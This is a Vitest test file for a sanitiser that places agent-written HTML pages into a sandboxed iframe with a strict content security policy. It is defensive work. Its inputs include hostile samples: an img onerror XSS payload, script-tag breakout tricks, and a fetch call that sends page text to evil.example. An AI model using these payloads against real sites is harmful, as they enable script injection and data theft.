import { describe, expect, it, vi } from "vitest";
import { FABRIC_RUNTIME_SCRIPT } from "../fabric-runtime-script";
import {
	buildProjectFrameSrcdoc,
	isProjectFrameHeightMessage,
	PROJECT_FRAME_CSP,
	PROJECT_FRAME_HEIGHT_MESSAGE,
	PROJECT_FRAME_SANDBOX,
} from "../project-frame-srcdoc";

const CSP_META_PATTERN =
	/<head><meta http-equiv="Content-Security-Policy" content="([^"]+)">/;

describe("buildProjectFrameSrcdoc", () => {
	it("injects the CSP meta as the first child of head", () => {
		const out = buildProjectFrameSrcdoc("<p>hello</p>");
		const match = out.match(CSP_META_PATTERN);
		expect(match).not.toBeNull();
		expect(match?.[1]).toBe(PROJECT_FRAME_CSP);
		expect(out.startsWith("<!doctype html><html><head>")).toBe(true);
	});

	it("never grants same-origin in the sandbox constant", () => {
		expect(PROJECT_FRAME_SANDBOX.split(/\s+/)).not.toContain(
			"allow-same-origin",
		);
		expect(PROJECT_FRAME_CSP).toContain("default-src 'none'");
	});

	it("lets a page's form fire its submit handler and never grants more than scripts and forms", () => {
		// Without allow-forms the browser blocks submission before `submit`
		// fires, so a page saving through a form handler never saved.
		expect(PROJECT_FRAME_SANDBOX.split(/\s+/)).toEqual([
			"allow-scripts",
			"allow-forms",
		]);
		expect(PROJECT_FRAME_CSP).toContain("form-action 'none'");
	});

	it("keeps the ids, names and limits a page's own script and form rely on", () => {
		// The form of a page Fabric Agent wrote on staging. Clobbering
		// protection stripped id="title" and id="submit" (they shadow document
		// and form properties), so getElementById('title') was null and the
		// page's save handler threw on its first line.
		const out = buildProjectFrameSrcdoc(
			[
				'<form id="form">',
				'<input id="title" name="title" maxlength="200" placeholder="Decision title" required />',
				'<input id="owner" name="owner" maxlength="120" placeholder="Owner" required />',
				'<button id="submit" type="submit">Add</button>',
				"</form>",
			].join(""),
		);

		expect(out).toContain('id="title"');
		expect(out).toContain('name="title"');
		expect(out).toContain('maxlength="200"');
		expect(out).toContain('id="submit"');
	});

	it("removes nested iframes and other browsing contexts", () => {
		const out = buildProjectFrameSrcdoc(
			[
				"<div>before</div>",
				'<iframe src="https://evil.example" sandbox="allow-same-origin"></iframe>',
				'<object data="https://evil.example/x.swf"></object>',
				'<embed src="https://evil.example/x.svg">',
				'<base href="https://evil.example/">',
				"<div>after</div>",
			].join(""),
		);
		expect(out).not.toMatch(/<iframe/i);
		expect(out).not.toMatch(/<object/i);
		expect(out).not.toMatch(/<embed/i);
		expect(out).not.toMatch(/<base/i);
		expect(out).toContain("<div>before</div>");
		expect(out).toContain("<div>after</div>");
	});

	it("keeps author scripts and inline styles (scripts are allowed by the CSP)", () => {
		const out = buildProjectFrameSrcdoc(
			'<style>body{color:red}</style><script>window.__demo = 1;</script><p id="a">x</p>',
		);
		expect(out).toContain("<style>body{color:red}</style>");
		expect(out).toContain("<script>window.__demo = 1;</script>");
		expect(out).toContain('<p id="a">x</p>');
	});

	it("preserves head styles from a full document", () => {
		const out = buildProjectFrameSrcdoc(
			"<!doctype html><html><head><title>Demo</title><style>h1{margin:0}</style></head><body><h1>Demo</h1></body></html>",
		);
		const headEnd = out.indexOf("</head>");
		const styleAt = out.indexOf("<style>h1{margin:0}</style>");
		expect(styleAt).toBeGreaterThan(-1);
		expect(styleAt).toBeLessThan(headEnd);
		expect(out).toContain("<h1>Demo</h1>");
	});

	it("neutralises look-alike </script> breakouts", () => {
		const out = buildProjectFrameSrcdoc(
			[
				"<script>var s = 'ok';</script >",
				'<img src="x" onerror="alert(1)">',
				'<script>var t = "</scr" + "ipt>";</script>',
				"<script><!--<script>x=1;</script>alert(2)--></script>",
				"<p>tail</p>",
			].join(""),
		);
		// Event handler attributes never survive.
		expect(out).not.toMatch(/onerror/i);
		// Every remaining `</script` is a real closing tag: count openings and
		// closings and make sure no script *text* contains a closing sequence.
		const opens = out.match(/<script\b/gi) ?? [];
		const closes = out.match(/<\/script/gi) ?? [];
		expect(closes.length).toBe(opens.length);
		const scriptBodies = Array.from(
			out.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/gi),
		).map((m) => m[1]);
		for (const body of scriptBodies) {
			expect(body).not.toMatch(/<\/\s*script/i);
		}
		expect(out).toContain("<p>tail</p>");
	});

	it("strips meta and link tags that could rewrite the document", () => {
		const out = buildProjectFrameSrcdoc(
			'<meta http-equiv="refresh" content="0;url=https://evil.example"><link rel="stylesheet" href="https://evil.example/a.css"><p>x</p>',
		);
		expect(out).not.toMatch(/refresh/i);
		expect(out).not.toMatch(/<link/i);
		// Exactly two metas: the injected CSP and the charset.
		expect(out.match(/<meta\b/gi)?.length).toBe(2);
	});

	it("appends the resize reporter that posts the height message", () => {
		const out = buildProjectFrameSrcdoc("<p>x</p>");
		expect(out).toContain(PROJECT_FRAME_HEIGHT_MESSAGE);
		expect(out).toContain("window.parent.postMessage");
		expect(out.trimEnd().endsWith("</script></body></html>")).toBe(true);
	});

	it("tolerates empty input", () => {
		const out = buildProjectFrameSrcdoc("");
		expect(out).toMatch(CSP_META_PATTERN);
		expect(out).toContain("<body>");
	});

	it("defines the page runtime after the CSP and ahead of every script of the page", () => {
		const out = buildProjectFrameSrcdoc(
			"<head><script>window.early = 1;</script></head><body><script>window.late = 1;</script></body>",
		);
		const csp = out.indexOf("Content-Security-Policy");
		const runtime = out.indexOf(FABRIC_RUNTIME_SCRIPT);
		expect(csp).toBeGreaterThan(-1);
		expect(runtime).toBeGreaterThan(csp);
		expect(runtime).toBeLessThan(out.indexOf("window.early"));
		expect(runtime).toBeLessThan(out.indexOf("window.late"));
		expect(out).toContain(`<script>${FABRIC_RUNTIME_SCRIPT}</script>`);
	});

	it("cannot be undone by the page's HTML: the runtime is not part of the sanitised input", () => {
		const out = buildProjectFrameSrcdoc(
			"<script>window.fabric = { call() {} };</script>",
		);
		expect(out.split(FABRIC_RUNTIME_SCRIPT).length).toBe(2);
	});

	describe("page scripts whose text looks like markup", () => {
		const LIST_SCRIPT =
			"const el = document.getElementById('list'); if (items && items.length) { el.innerHTML = items.map(x => '<li>' + x + '</li>').join('') + '</div>'; }";

		function parse(srcdoc: string): Document {
			return new DOMParser().parseFromString(srcdoc, "text/html");
		}

		it("keeps a script that builds HTML, verbatim", () => {
			const out = buildProjectFrameSrcdoc(
				`<ul id="list"></ul><script>${LIST_SCRIPT}</script>`,
			);
			expect(out).toContain(`<script>${LIST_SCRIPT}</script>`);
		});

		it("keeps every such script, in the head and the body, in order", () => {
			const out = buildProjectFrameSrcdoc(
				"<head><script>window.a = '<b>';</script></head><body><p>x</p><script>window.b = '</p>';</script><script>window.c = '<!-- c -->';</script></body>",
			);
			const texts = Array.from(parse(out).querySelectorAll("script")).map(
				(script) => script.textContent,
			);
			expect(texts.slice(1, -1)).toEqual([
				"window.a = '<b>';",
				"window.b = '</p>';",
				"window.c = '<!-- c -->';",
			]);
		});

		it("keeps the attributes of the script tag, including a quoted '>'", () => {
			const out = buildProjectFrameSrcdoc(
				`<script data-note="a>b" id="page">${LIST_SCRIPT}</script>`,
			);
			const script = parse(out).getElementById("page");
			expect(script?.getAttribute("data-note")).toBe("a>b");
			expect(script?.textContent).toBe(LIST_SCRIPT);
		});

		it("matches the parser: the script ends at the first </script, whatever its case or spacing", () => {
			const out = buildProjectFrameSrcdoc(
				"<script>window.a = '<i>';</SCRIPT ><p id='tail'>tail</p><script>window.b = '<u>';</script>",
			);
			const doc = parse(out);
			const texts = Array.from(doc.querySelectorAll("script")).map(
				(script) => script.textContent,
			);
			expect(texts.slice(1, -1)).toEqual([
				"window.a = '<i>';",
				"window.b = '<u>';",
			]);
			expect(doc.getElementById("tail")?.textContent).toBe("tail");
		});

		it("still escapes a </script left in the text", () => {
			const out = buildProjectFrameSrcdoc(
				"<script>var s = '<li>' + \"</script\"",
			);
			expect(out).toContain(
				"<script>var s = '<li>' + \"<\\/script\"</script>",
			);
			expect(out.match(/<script\b/gi)?.length).toBe(
				out.match(/<\/script/gi)?.length,
			);
		});

		it("keeps a <!--<script opener from swallowing the rest of the document", () => {
			const out = buildProjectFrameSrcdoc(
				"<script>var s = '<!--<script>';</script><p id='rest'>rest</p>",
			);
			const doc = parse(out);
			expect(doc.querySelectorAll("script").length).toBe(3);
			expect(doc.getElementById("rest")?.textContent).toBe("rest");
			expect(out).not.toMatch(/<script\s*>var s = '<!--<script/i);
		});

		it("does not replace placeholder text found in an element that is not a script", () => {
			const randomValues = vi
				.spyOn(crypto, "getRandomValues")
				.mockImplementation(
					<T extends ArrayBufferView | null>(array: T): T => {
						if (array instanceof Uint8Array) {
							array.fill(0xab);
						}
						return array;
					},
				);
			try {
				const placeholder = `fabric-script-${"ab".repeat(16)}-0`;
				const out = buildProjectFrameSrcdoc(
					`<p id="decoy">${placeholder}</p><script>${LIST_SCRIPT}</script>`,
				);
				const doc = parse(out);
				expect(doc.getElementById("decoy")?.textContent).toBe(
					placeholder,
				);
				expect(out).toContain(`<script>${LIST_SCRIPT}</script>`);
				expect(out.split(LIST_SCRIPT).length).toBe(2);
			} finally {
				randomValues.mockRestore();
			}
		});

		it("uses a different placeholder on every call", () => {
			const randomValues = vi.spyOn(crypto, "getRandomValues");
			try {
				buildProjectFrameSrcdoc("<script>a('<li>')</script>");
				buildProjectFrameSrcdoc("<script>a('<li>')</script>");
				const [first, second] = randomValues.mock.results.map(
					(result) =>
						Array.from(result.value as Uint8Array).join(","),
				);
				expect(first).not.toBe(second);
			} finally {
				randomValues.mockRestore();
			}
		});

		it("still removes a forbidden tag that sits next to such a script", () => {
			const out = buildProjectFrameSrcdoc(
				`<div><iframe src="https://evil.example"></iframe><object data="https://evil.example/x"></object><script>${LIST_SCRIPT} document.body.innerHTML = '<iframe>';</script></div>`,
			);
			const doc = parse(out);
			expect(doc.querySelector("iframe")).toBeNull();
			expect(doc.querySelector("object")).toBeNull();
			expect(doc.querySelectorAll("script")[1]?.textContent).toContain(
				"'<iframe>'",
			);
		});

		it("does not turn a script src into something the CSP would allow", () => {
			const out = buildProjectFrameSrcdoc(
				'<script src="https://evil.example/a.js"></script><p>x</p>',
			);
			expect(PROJECT_FRAME_CSP).toMatch(
				/script-src 'unsafe-inline'(;|$)/,
			);
			expect(PROJECT_FRAME_CSP).not.toContain("evil.example");
			expect(parse(out).querySelector("script[src]")?.textContent).toBe(
				"",
			);
		});

		it("keeps the runtime ahead of scripts that build HTML", () => {
			const out = buildProjectFrameSrcdoc(
				"<head><script>window.early = '<b>';</script></head><body><script>window.late = '</p>';</script></body>",
			);
			const runtime = out.indexOf(FABRIC_RUNTIME_SCRIPT);
			expect(runtime).toBeGreaterThan(
				out.indexOf("Content-Security-Policy"),
			);
			expect(runtime).toBeLessThan(out.indexOf("window.early"));
			expect(runtime).toBeLessThan(out.indexOf("window.late"));
			expect(out.split(FABRIC_RUNTIME_SCRIPT).length).toBe(2);
		});
	});

	describe("without scripts (a page an unattended run wrote)", () => {
		const NO_SCRIPTS = { scripts: false } as const;

		function pageScripts(srcdoc: string): Element[] {
			return Array.from(
				new DOMParser()
					.parseFromString(srcdoc, "text/html")
					.querySelectorAll("script"),
			);
		}

		it("removes every script of the page and the page runtime, keeping the rest", () => {
			const out = buildProjectFrameSrcdoc(
				"<head><script>window.early = '<b>';</script></head><body><h1>Weekly report</h1><script>fetch('https://evil.example/?d=' + document.body.innerText)</script><p>Done</p></body>",
				NO_SCRIPTS,
			);

			expect(out).not.toContain("window.early");
			expect(out).not.toContain("evil.example");
			expect(out).not.toContain(FABRIC_RUNTIME_SCRIPT);
			expect(out).toContain("<h1>Weekly report</h1>");
			expect(out).toContain("<p>Done</p>");
		});

		it("leaves only the resize reporter to run, after the page", () => {
			const out = buildProjectFrameSrcdoc(
				"<script>a('<li>')</script><p>x</p><script src='https://evil.example/a.js'></script>",
				NO_SCRIPTS,
			);

			const scripts = pageScripts(out);
			expect(scripts).toHaveLength(1);
			expect(scripts[0].textContent).toContain(
				PROJECT_FRAME_HEIGHT_MESSAGE,
			);
			expect(out.trimEnd().endsWith("</script></body></html>")).toBe(
				true,
			);
		});

		it("removes a script inside an svg and one spelled in capitals", () => {
			const out = buildProjectFrameSrcdoc(
				"<svg><script>alert(1)</script></svg><SCRIPT >alert(2)</SCRIPT><p>kept</p>",
				NO_SCRIPTS,
			);

			expect(pageScripts(out)).toHaveLength(1);
			expect(out).not.toMatch(/alert\(/);
			expect(out).toContain("<p>kept</p>");
		});

		it("keeps the CSP first in the head and the sandbox rules unchanged", () => {
			const out = buildProjectFrameSrcdoc("<p>x</p>", NO_SCRIPTS);

			expect(out.match(CSP_META_PATTERN)?.[1]).toBe(PROJECT_FRAME_CSP);
		});

		it("still removes nested browsing contexts and event handlers", () => {
			const out = buildProjectFrameSrcdoc(
				'<iframe src="https://evil.example"></iframe><img src="x" onerror="alert(1)"><p>x</p>',
				NO_SCRIPTS,
			);

			expect(out).not.toMatch(/<iframe/i);
			expect(out).not.toMatch(/onerror/i);
		});

		it("does not rewrite markup-looking text where a script would have been shielded", () => {
			const out = buildProjectFrameSrcdoc(
				"<title>&lt;script&gt;x&lt;/script&gt;</title><p>x</p>",
				NO_SCRIPTS,
			);

			expect(out).not.toContain("fabric-script-");
		});

		it("is the same as the default for a page with no script", () => {
			const html = "<style>p{color:red}</style><h1>Hi</h1><p>Body</p>";

			expect(
				buildProjectFrameSrcdoc(html, NO_SCRIPTS).replace(
					`<script>${FABRIC_RUNTIME_SCRIPT}</script>`,
					"",
				),
			).toBe(
				buildProjectFrameSrcdoc(html).replace(
					`<script>${FABRIC_RUNTIME_SCRIPT}</script>`,
					"",
				),
			);
		});
	});
});

describe("isProjectFrameHeightMessage", () => {
	it("accepts only well-formed height messages", () => {
		expect(
			isProjectFrameHeightMessage({
				type: PROJECT_FRAME_HEIGHT_MESSAGE,
				height: 640,
			}),
		).toBe(true);
		expect(
			isProjectFrameHeightMessage({
				type: PROJECT_FRAME_HEIGHT_MESSAGE,
				height: "640",
			}),
		).toBe(false);
		expect(
			isProjectFrameHeightMessage({
				type: PROJECT_FRAME_HEIGHT_MESSAGE,
				height: Number.NaN,
			}),
		).toBe(false);
		expect(isProjectFrameHeightMessage({ type: "other" })).toBe(false);
		expect(isProjectFrameHeightMessage(null)).toBe(false);
	});
});
